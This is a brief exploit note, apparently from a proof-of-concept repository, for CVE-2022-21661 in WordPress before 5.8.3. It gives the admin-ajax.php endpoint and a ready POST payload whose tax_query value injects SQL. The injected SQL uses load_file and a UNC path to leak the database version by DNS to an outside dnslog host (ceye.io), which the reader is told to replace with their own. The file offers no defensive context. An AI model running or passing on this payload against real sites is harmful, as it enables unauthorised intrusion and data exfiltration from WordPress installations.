# wordpress-CVE-2022-21661
#version<5.8.3

path：http://your target/wp-admin/admin-ajax.php

The injection type is out-of-band, you need to specify dnslog yourself and replace ceye.io

POST- DATA：{"tax_query":[{"field":"term_taxonomy_id","terms":["1) and if((select load_file(concat('\\\\',(select version()),'.27s601.ceye.io\\abc'))),1,1)-- a"]}]}
